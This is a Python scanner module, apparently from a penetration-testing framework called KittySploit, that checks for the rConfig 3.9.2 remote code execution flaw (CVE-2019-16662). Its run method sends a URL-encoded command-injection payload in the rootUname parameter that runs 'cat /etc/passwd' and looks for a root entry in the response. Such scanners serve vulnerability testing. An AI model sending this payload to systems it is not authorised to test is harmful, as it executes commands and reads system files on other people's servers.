#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""rConfig 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'rConfig 3.9.2 - Remote Code Execution Detection',
        'description': 'rConfig 3.9.2 is susceptible to a remote code execution vulnerability. An attacker can directly execute system commands by sending a GET request to ajaxServerSettingsChk.php because the rootUname parameter is passed to the exec function without filtering, which can lead to command execution.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'intrusive', 'rconfig', 'packetstorm', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-16662',
            'https://drive.google.com/open?id=1OXI5cNuwWqc6y-7BgNCfYHgFPK2cpvnu',
            'http://packetstormsecurity.com/files/154999/rConfig-3.9.2-Remote-Code-Execution.html',
            'http://packetstormsecurity.com/files/155186/rConfig-3.9.2-Command-Injection.html',
        ],
        'cve': 'CVE-2019-16662',
    }

    def run(self):
        r = self.http_request(method="GET", path='/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="rConfig 3.9.2 - Remote Code Execution detected",
                path='/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23',
            )
            return True
        return False

